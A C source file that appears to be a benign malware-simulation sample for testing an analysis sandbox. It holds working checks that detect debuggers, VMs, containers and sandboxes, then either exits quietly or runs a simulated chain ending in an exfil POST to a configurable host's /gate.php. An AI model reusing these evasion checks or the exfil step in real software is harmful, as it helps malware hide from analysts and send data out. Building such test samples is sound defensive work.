// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// evade.c — the evasive variant: environment checks first, then either a quiet
// exit or the whole chain.
//
// Real evasive malware looks at where it runs before it does anything, and
// walks away when the answer is "an analysis environment". This does the same,
// harmlessly. The gate asks the guest, with ordinary system calls Antinomie
// records (open and read of /sys and /proc files, access, stat, sysinfo,
// ptrace), whether it is being debugged, runs in a VM, in a container or in a
// bare sandbox. If any category trips, the sample prints which checks did,
// optionally reads /etc/hostname, looks once more, sleeps three to five
// seconds and exits 0: no download, no persistence, no beacon. If every check
// is clean it runs the chain: recon, the hash-pinned download, the
// persistence lookalikes, the beacon loop and one exfil POST, using the code
// of those scenarios.
//
// Which answers the Stealth profile can change is named per check (see
// BEHAVIOR-SAMPLES.md): the DMI strings, the hypervisor CPU flag, the MAC
// address, the virtio devices and the disk model come from the profile, so the
// same binary evades on a default guest and proceeds on a Realistic one. The
// debugger and container answers, the size of the VM and the uptime are not
// something the profile sets.
//
// --test-root DIR (tests only) reads every file below DIR instead of the real
// system, and DIR/overrides can fake the checks that are not files.
#include "samples.h"

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/statfs.h>
#include <sys/sysinfo.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

enum { CAT_DEBUGGER, CAT_VM, CAT_CONTAINER, CAT_SANDBOX, CAT_COUNT };
static const char *const category_names[CAT_COUNT] = {"debugger", "vm", "container", "sandbox"};

#define SANDBOX_MIN_HINTS 3
#define SLEEP_MIN_MS 3000
#define SLEEP_MAX_MS 4500
#define UPTIME_FLOOR 60
#define PROCESS_FLOOR 10
#define RAM_FLOOR (1ull << 30)
#define DISK_FLOOR (4ull << 30)
#define REASON_CAP 480

struct gate {
    int run;
    int tripped;
    int checks;
    int hints;
    unsigned ignore;
    int why;
    int sleep_ms;
    char root[240];
    char overrides[512];
    char reason[CAT_COUNT][REASON_CAP];
    int pending; // the evade tail (decoy, last look, sleep) is still to do
    char names[96];
    const char *module;
};

static struct gate gate;

static const char *override(const char *key)
{
    static char value[128];
    size_t length = strlen(key);
    for (const char *line = gate.overrides; *line;) {
        const char *end = strchr(line, '\n');
        size_t part = end ? (size_t)(end - line) : strlen(line);
        if (part > length && !strncmp(line, key, length) && line[length] == '=') {
            snprintf(value, sizeof value, "%.*s", (int)(part - length - 1), line + length + 1);
            return value;
        }
        line += part + (end ? 1 : 0);
    }
    return NULL;
}

static int testing(void)
{
    return gate.root[0] != 0;
}

// The path of a system file, below the test root when there is one.
static const char *where(const char *path, char *buffer, size_t cap)
{
    if (!testing())
        return path;
    snprintf(buffer, cap, "%s%s", gate.root, path);
    return buffer;
}

static ssize_t read_text(const char *path, char *output, size_t cap)
{
    char real[512];
    int fd = open(where(path, real, sizeof real), O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return -1;
    ssize_t got = read(fd, output, cap - 1);
    close(fd);
    if (got < 0)
        return -1;
    output[got] = '\0';
    while (got > 0 && (output[got - 1] == '\n' || output[got - 1] == ' '))
        output[--got] = '\0';
    return got;
}

static int present(const char *path)
{
    char real[512];
    return access(where(path, real, sizeof real), F_OK) == 0;
}

static int has_word(const char *text, const char *const *words)
{
    char lower[256];
    size_t i = 0;
    for (; text[i] && i + 1 < sizeof lower; i++)
        lower[i] = (char)((text[i] >= 'A' && text[i] <= 'Z') ? text[i] + 32 : text[i]);
    lower[i] = '\0';
    for (size_t w = 0; words[w]; w++)
        if (strstr(lower, words[w]))
            return 1;
    return 0;
}

static const char *const vm_words[] = {"qemu",      "kvm",    "virtualbox",     "vbox",
                                       "vmware",    "bochs",  "xen",            "innotek",
                                       "parallels", "bhyve",  "seabios",        "standard pc",
                                       "virtual machine", "virtual disk", "hyper-v", "tcg", NULL};

// Records one check. `trip` adds the reason to the category; the line is
// printed with --why whatever the answer.
static void check(int category, int trip, const char *stealth, const char *fmt, ...)
{
    char answer[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(answer, sizeof answer, fmt, args);
    va_end(args);
    gate.checks++;
    if (trip) {
        size_t used = strlen(gate.reason[category]);
        if (used + strlen(answer) + 3 < REASON_CAP)
            snprintf(gate.reason[category] + used, REASON_CAP - used, "%s%s", used ? "; " : "",
                     answer);
    }
    if (gate.why)
        printf("%-11s %-17s %-9s %s -> %s  [Stealth: %s]\n", "CHECK", gate.module,
               category_names[category], answer, trip ? "analysis environment" : "clean",
               stealth);
}

// An answer that is only information: shown with --why, never decides.
static void info(int category, const char *stealth, const char *fmt, ...)
{
    if (!gate.why)
        return;
    char answer[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(answer, sizeof answer, fmt, args);
    va_end(args);
    printf("%-11s %-17s %-9s %s -> info only  [Stealth: %s]\n", "CHECK", gate.module,
           category_names[category], answer, stealth);
}

static int skipped(int category)
{
    if (!(gate.ignore & (1u << category)))
        return 0;
    if (gate.why)
        printf("%-11s %-17s %-9s skipped (--ignore)\n", "CHECK", gate.module,
               category_names[category]);
    return 1;
}

// ---- debugger ----------------------------------------------------------------------

static int traceme_child(void *context)
{
    (void)context;
    return ptrace(PTRACE_TRACEME, 0, NULL, NULL) == 0 ? 0 : (errno > 0 && errno < 256 ? errno : 1);
}

static void check_debugger(void)
{
    if (skipped(CAT_DEBUGGER))
        return;
    static const char *const tools[] = {"frida", "gum-js", "gdbserver", "libfaketime", "valgrind",
                                        "xposed", "libasan", NULL};
    const char *none = "none: Antinomie's debugger uses no ptrace, TracerPid stays 0";
    char text[8192];
    int tracer = 0;
    if (read_text("/proc/self/status", text, sizeof text) >= 0) {
        const char *row = strstr(text, "TracerPid:");
        tracer = row ? atoi(row + 10) : 0;
    }
    check(CAT_DEBUGGER, tracer != 0, none, "TracerPid=%d", tracer);

    int refused = 0;
    const char *fake = testing() ? override("traceme") : NULL;
    if (fake)
        refused = !strcmp(fake, "eperm") ? 1 : 0;
    else
        refused = sample_in_child(traceme_child, NULL, 2000) != 0;
    check(CAT_DEBUGGER, refused, none, "PTRACE_TRACEME %s", refused ? "refused (EPERM)" : "accepted");

    const char *preload = testing() ? override("ld_preload") : getenv("LD_PRELOAD");
    const char *audit = testing() ? override("ld_audit") : getenv("LD_AUDIT");
    int loaded = (preload && *preload) || (audit && *audit);
    check(CAT_DEBUGGER, loaded, none, "LD_PRELOAD/LD_AUDIT %s", loaded ? "set" : "unset");

    int hit = 0;
    char found[64] = "";
    if (read_text("/proc/self/maps", text, sizeof text) >= 0) {
        for (size_t i = 0; tools[i] && !hit; i++)
            if (strstr(text, tools[i])) {
                hit = 1;
                snprintf(found, sizeof found, "%s", tools[i]);
            }
    }
    check(CAT_DEBUGGER, hit, none, "maps %s%s", hit ? "name " : "name no instrumentation library", hit ? found : "");
}

// ---- VM ----------------------------------------------------------------------------

static const char *const mac_prefixes[] = {"52:54:00", "08:00:27", "0a:00:27", "00:0c:29",
                                           "00:50:56", "00:05:69", "00:1c:14", "00:16:3e",
                                           "00:15:5d", "00:1c:42", NULL};

static void check_vm(void)
{
    if (skipped(CAT_VM))
        return;
    char text[16384];
    static const struct {
        const char *file;
        const char *stealth;
    } dmi[] = {
        {"sys_vendor", "Hardware identity > System maker"},
        {"product_name", "Hardware identity > Product"},
        {"board_vendor", "Hardware identity > Board maker"},
        {"bios_vendor", "Hardware identity > BIOS vendor"},
    };
    for (size_t i = 0; i < sizeof dmi / sizeof dmi[0]; i++) {
        char path[128], value[128];
        snprintf(path, sizeof path, "/sys/class/dmi/id/%s", dmi[i].file);
        if (read_text(path, value, sizeof value) < 0) {
            info(CAT_VM, dmi[i].stealth, "dmi %s unreadable", dmi[i].file);
            continue;
        }
        check(CAT_VM, has_word(value, vm_words), dmi[i].stealth, "dmi %s=%s", dmi[i].file, value);
    }
    char chassis[32];
    if (read_text("/sys/class/dmi/id/chassis_type", chassis, sizeof chassis) >= 0)
        check(CAT_VM, !strcmp(chassis, "1") || !strcmp(chassis, "2"), "Hardware identity > Chassis",
              "dmi chassis_type=%s", chassis);

    if (read_text("/proc/cpuinfo", text, sizeof text) >= 0) {
        const char *flags = strstr(text, "\nflags");
        if (!flags && !strncmp(text, "flags", 5))
            flags = text;
        int hypervisor = 0;
        if (flags) {
            const char *end = strchr(flags + 1, '\n');
            size_t span = end ? (size_t)(end - flags) : strlen(flags);
            char line[2048];
            snprintf(line, sizeof line, "%.*s", (int)(span < sizeof line - 1 ? span : sizeof line - 1), flags);
            for (char *word = strtok(line, " \t:\n"); word; word = strtok(NULL, " \t:\n"))
                if (!strcmp(word, "hypervisor"))
                    hypervisor = 1;
        }
        check(CAT_VM, hypervisor, "CPU > Hide the hypervisor CPU flag", "cpuinfo hypervisor flag %s",
              hypervisor ? "set" : "absent");
        const char *model = strstr(text, "model name");
        char name[128] = "";
        if (model) {
            const char *colon = strchr(model, ':');
            const char *end = colon ? strchr(colon, '\n') : NULL;
            if (colon) {
                size_t span = end ? (size_t)(end - colon - 1) : strlen(colon + 1);
                snprintf(name, sizeof name, "%.*s", (int)(span < sizeof name - 1 ? span : sizeof name - 1),
                         colon + 1);
            }
        }
        const char *trimmed = name + strspn(name, " ");
        check(CAT_VM, has_word(trimmed, vm_words), "CPU > Model, Brand string or Pass the host CPU through",
              "cpuinfo model name=%s", trimmed[0] ? trimmed : "(none)");
    }

    // Network cards: the MAC address and the PCI vendor of each interface.
    char net_dir[512];
    DIR *net = opendir(where("/sys/class/net", net_dir, sizeof net_dir));
    int cards = 0;
    if (net) {
        struct dirent *entry;
        while (cards < 8 && (entry = readdir(net))) {
            if (entry->d_name[0] == '.' || !strcmp(entry->d_name, "lo"))
                continue;
            cards++;
            char path[300], value[64];
            snprintf(path, sizeof path, "/sys/class/net/%.64s/address", entry->d_name);
            if (read_text(path, value, sizeof value) >= 0) {
                int oui = 0;
                for (size_t i = 0; mac_prefixes[i]; i++)
                    if (!strncasecmp(value, mac_prefixes[i], 8))
                        oui = 1;
                check(CAT_VM, oui, "Network > MAC address", "mac %s (%s)", oui ? "VM prefix" : "ordinary", value);
            }
            snprintf(path, sizeof path, "/sys/class/net/%.64s/device/vendor", entry->d_name);
            if (read_text(path, value, sizeof value) >= 0) {
                int vendor = !strcasecmp(value, "0x1af4") || !strcasecmp(value, "0x15ad") ||
                             !strcasecmp(value, "0x80ee");
                check(CAT_VM, vendor, "Network > Card (e1000e instead of virtio)", "%s PCI vendor %s",
                      entry->d_name, value);
            }
        }
        closedir(net);
    }

    // Disks: a virtio block device, or a model string QEMU wrote.
    char block_dir[512];
    DIR *block = opendir(where("/sys/block", block_dir, sizeof block_dir));
    if (block) {
        struct dirent *entry;
        int disks = 0;
        while (disks < 8 && (entry = readdir(block))) {
            if (entry->d_name[0] == '.')
                continue;
            disks++;
            if (!strncmp(entry->d_name, "vd", 2))
                check(CAT_VM, 1, "Storage and devices > Disk bus (SATA or NVMe)", "block device %s is virtio",
                      entry->d_name);
            char path[300], value[96];
            snprintf(path, sizeof path, "/sys/block/%.64s/device/model", entry->d_name);
            if (read_text(path, value, sizeof value) >= 0)
                check(CAT_VM, has_word(value, vm_words), "Storage and devices > Disk bus (SATA) and Disk model",
                      "%s model=%s", entry->d_name, value);
        }
        closedir(block);
    }

    char clock[64];
    if (read_text("/sys/devices/system/clocksource/clocksource0/current_clocksource", clock, sizeof clock) >= 0)
        check(CAT_VM, !strncmp(clock, "kvm", 3) || !strncmp(clock, "hyperv", 6) || !strncmp(clock, "xen", 3),
              "CPU > Hide the KVM signature", "clocksource %s", clock);

    // Answers the profile cannot change: shown, never decisive.
    const char *still = "none: Still visible (fw_cfg, virtio transport)";
    if (present("/sys/firmware/qemu_fw_cfg"))
        info(CAT_VM, still, "/sys/firmware/qemu_fw_cfg present");
    if (present("/sys/bus/virtio/devices"))
        info(CAT_VM, still, "/sys/bus/virtio/devices present");
    if (present("/sys/hypervisor/type"))
        info(CAT_VM, still, "/sys/hypervisor/type present");
}

// ---- container ---------------------------------------------------------------------

static void check_container(void)
{
    if (skipped(CAT_CONTAINER))
        return;
    const char *none = "none: the guest is not a container";
    check(CAT_CONTAINER, present("/.dockerenv"), none, "/.dockerenv %s",
          present("/.dockerenv") ? "present" : "absent");
    check(CAT_CONTAINER, present("/run/.containerenv"), none, "/run/.containerenv %s",
          present("/run/.containerenv") ? "present" : "absent");
    static const char *const markers[] = {"docker", "kubepods", "containerd", "lxc", "podman", "crio", NULL};
    static const char *const cgroups[] = {"/proc/1/cgroup", "/proc/self/cgroup"};
    for (size_t i = 0; i < sizeof cgroups / sizeof cgroups[0]; i++) {
        char text[2048];
        if (read_text(cgroups[i], text, sizeof text) >= 0)
            check(CAT_CONTAINER, has_word(text, markers), none, "%s %s", cgroups[i],
                  has_word(text, markers) ? "names a container runtime" : "names none");
    }
    const char *env = testing() ? override("container") : getenv("container");
    check(CAT_CONTAINER, env && *env, none, "container environment variable %s",
          env && *env ? env : "unset");
}

// ---- sandbox hints -------------------------------------------------------------------

static long process_count(void)
{
    long count = 0;
    DIR *proc = opendir("/proc");
    if (!proc)
        return -1;
    struct dirent *entry;
    while (count < 100000 && (entry = readdir(proc)))
        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9')
            count++;
    closedir(proc);
    return count;
}

static void hint(int fired, const char *fmt, ...)
{
    char answer[200];
    va_list args;
    va_start(args, fmt);
    vsnprintf(answer, sizeof answer, fmt, args);
    va_end(args);
    gate.checks++;
    gate.hints += fired ? 1 : 0;
    // Hints are counted, not decisive one by one: the reason line names the ones
    // that fired together, and only when enough of them did.
    if (fired) {
        size_t used = strlen(gate.reason[CAT_SANDBOX]);
        if (used + strlen(answer) + 3 < REASON_CAP)
            snprintf(gate.reason[CAT_SANDBOX] + used, REASON_CAP - used, "%s%s", used ? "; " : "", answer);
    }
    if (gate.why)
        printf("%-11s %-17s %-9s %s -> %s  [Stealth: none: the VM's own size settings and a fresh "
               "boot (Still visible)]\n", "CHECK", gate.module, "sandbox", answer,
               fired ? "hint" : "clean");
}

static void check_sandbox(void)
{
    if (skipped(CAT_SANDBOX))
        return;
    const char *fake;
    long cpus = 0;
    cpu_set_t set;
    if (!testing() && sched_getaffinity(0, sizeof set, &set) == 0)
        cpus = CPU_COUNT(&set);
    if (testing() && (fake = override("cpus")))
        cpus = atol(fake);
    if (cpus > 0)
        hint(cpus < 2, "%ld CPU%s", cpus, cpus == 1 ? "" : "s");

    unsigned long long ram = 0;
    struct sysinfo info_;
    if (!testing() && sysinfo(&info_) == 0)
        ram = (unsigned long long)info_.totalram * info_.mem_unit;
    if (testing() && (fake = override("ram")))
        ram = strtoull(fake, NULL, 10);
    if (ram)
        hint(ram < RAM_FLOOR, "%llu MiB of RAM", ram >> 20);

    unsigned long long disk = 0;
    struct statfs fs;
    if (!testing() && statfs("/", &fs) == 0)
        disk = (unsigned long long)fs.f_blocks * (unsigned long long)fs.f_bsize;
    if (testing() && (fake = override("disk")))
        disk = strtoull(fake, NULL, 10);
    if (disk)
        hint(disk < DISK_FLOOR, "root filesystem %llu MiB", disk >> 20);

    long procs = testing() ? -1 : process_count();
    if (testing() && (fake = override("procs")))
        procs = atol(fake);
    if (procs >= 0)
        hint(procs < PROCESS_FLOOR, "%ld processes", procs);

    char text[128];
    if (read_text("/proc/uptime", text, sizeof text) >= 0) {
        double seconds = atof(text);
        hint(seconds < UPTIME_FLOOR, "uptime %.0f s", seconds);
    }
}

// ---- the gate --------------------------------------------------------------------------

static unsigned parse_ignore(const char *list)
{
    unsigned mask = 0;
    char copy[128];
    snprintf(copy, sizeof copy, "%s", list ? list : "");
    for (char *name = strtok(copy, ","); name; name = strtok(NULL, ",")) {
        for (int c = 0; c < CAT_COUNT; c++)
            if (!strcmp(name, category_names[c]))
                mask |= 1u << c;
    }
    return mask;
}

// stdout carries the scorecard; stderr repeats the line only when it goes somewhere else, so a
// terminal that shows both streams prints it once.
static void both(const char *text)
{
    printf("%s\n", text);
    fflush(stdout);
    struct stat out, err;
    if (fstat(STDOUT_FILENO, &out) == 0 && fstat(STDERR_FILENO, &err) == 0 &&
        out.st_dev == err.st_dev && out.st_ino == err.st_ino)
        return;
    fprintf(stderr, "%s\n", text);
    fflush(stderr);
}

static int load_overrides(const char *root)
{
    char path[400];
    snprintf(path, sizeof path, "%s/overrides", root);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return 0;
    ssize_t got = read(fd, gate.overrides, sizeof gate.overrides - 1);
    close(fd);
    if (got > 0)
        gate.overrides[got] = '\0';
    return 1;
}

// Runs every check and prints the verdict. Returns 1 when the sample should evade.
int sample_gate_run(const struct options *options, const char *module)
{
    memset(&gate, 0, sizeof gate);
    gate.run = 1;
    gate.module = module;
    gate.why = options->why;
    gate.ignore = parse_ignore(options->ignore);
    if (options->test_root) {
        snprintf(gate.root, sizeof gate.root, "%s", options->test_root);
        load_overrides(gate.root);
    }
    gate.sleep_ms = options->evade_sleep_ms >= 0
                        ? options->evade_sleep_ms
                        : SLEEP_MIN_MS + (int)((unsigned)getpid() * 2654435761u % (SLEEP_MAX_MS - SLEEP_MIN_MS + 1));
    check_debugger();
    check_vm();
    check_container();
    check_sandbox();
    if (gate.hints < SANDBOX_MIN_HINTS)
        gate.reason[CAT_SANDBOX][0] = '\0';
    char *tripped = gate.names;
    for (int c = 0; c < CAT_COUNT; c++) {
        if (!gate.reason[c][0])
            continue;
        gate.tripped = 1;
        char line[REASON_CAP + 32];
        snprintf(line, sizeof line, "EVADE %s: %s", category_names[c], gate.reason[c]);
        both(line);
        size_t used = strlen(tripped);
        snprintf(tripped + used, sizeof gate.names - used, "%s%s", used ? "," : "", category_names[c]);
    }
    printf("%-11s %-17s verdict=%s tripped=%s checks=%d sandbox_hints=%d/%d\n", "GATE", module,
           gate.tripped ? "evade" : "proceed", tripped[0] ? tripped : "-", gate.checks, gate.hints,
           SANDBOX_MIN_HINTS);
    fflush(stdout);
    gate.pending = gate.tripped;
    return gate.tripped;
}

// What the evading sample does last: a benign decoy, one more look at the
// answers that made it leave, a short bounded sleep, then it ends with
// status 0. Nothing is written after the last look.
void sample_gate_finish(void)
{
    if (!gate.pending)
        return;
    gate.pending = 0;
    char hostname[128] = "";
    if (read_text("/etc/hostname", hostname, sizeof hostname) < 0)
        hostname[0] = '\0';
    printf("hello%s%s\n", hostname[0] ? " from " : "", hostname);
    fflush(stdout);
    // The last look, after everything is printed: a malware author re-checks.
    char text[256];
    read_text("/sys/class/dmi/id/sys_vendor", text, sizeof text);
    read_text("/proc/cpuinfo", text, sizeof text);
    read_text("/proc/uptime", text, sizeof text);
    int milliseconds = gate.sleep_ms > SAMPLE_MAX_EVADE_SLEEP_MS ? SAMPLE_MAX_EVADE_SLEEP_MS : gate.sleep_ms;
    sample_delay(milliseconds);
}

// ---- the evasive scenario -----------------------------------------------------------------

SCENARIO(evasive)
{
    const char *name = "evasive";
    if (sample_gate_run(options, name)) {
        sample_pass(name, "analysis environment detected (%s): no download, no persistence, no "
                       "beacon; decoy, last look and a %d ms sleep follow, then exit 0",
                 gate.names, gate.sleep_ms);
        printf("%-11s %-17s evade: evasion.sandbox_probe,evasion.debugger_check,"
               "evasion.container_check,evasion.probe_then_exit\n", "PATH", name);
        return 0;
    }
    printf("%-11s %-17s proceed: the checks' rows, then the chain's (see EXPECT)\n", "PATH", name);
    int status = 0;
    status |= scenario_recon(options);
    status |= scenario_download(options);
    status |= scenario_persistence(options);
    status |= scenario_beacon_loop(options);

    // One exfil POST of what the chain collected.
    char body[256];
    snprintf(body, sizeof body, "stage=exfil&scenario=evasive&files=%d&bytes=%d", 3, 1024);
    unsigned long long received = 0;
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    int sent = sample_http_request(host, port, "POST", "/gate.php", body, strlen(body), &received) == 0;
    if (!sent)
        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
    sample_pass(name, "every check clean: recon, download and run, persistence lookalikes, beacon "
                   "loop and one exfil POST %s to %s:%d",
             sent ? "sent" : "attempted", host, port);
    return status;
}
